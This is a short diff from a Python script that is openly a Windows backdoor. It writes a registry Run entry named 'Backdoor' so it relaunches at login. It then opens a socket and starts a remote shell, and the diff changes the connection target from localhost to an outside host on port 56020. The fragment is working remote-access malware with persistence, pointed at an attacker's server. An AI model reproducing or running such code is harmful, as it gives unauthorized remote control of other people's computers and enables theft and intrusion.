@@ -51,6 +51,6 @@ if not os.path.exists(location):
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #usage for ipv4 add & tcp connection to server
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.connect(("127.0.0.1",54321)) #ip of host + desired port
+sock.connect(("sga.domcloud.io",56020)) #ip of host + desired port
 shell()
 sock.close()
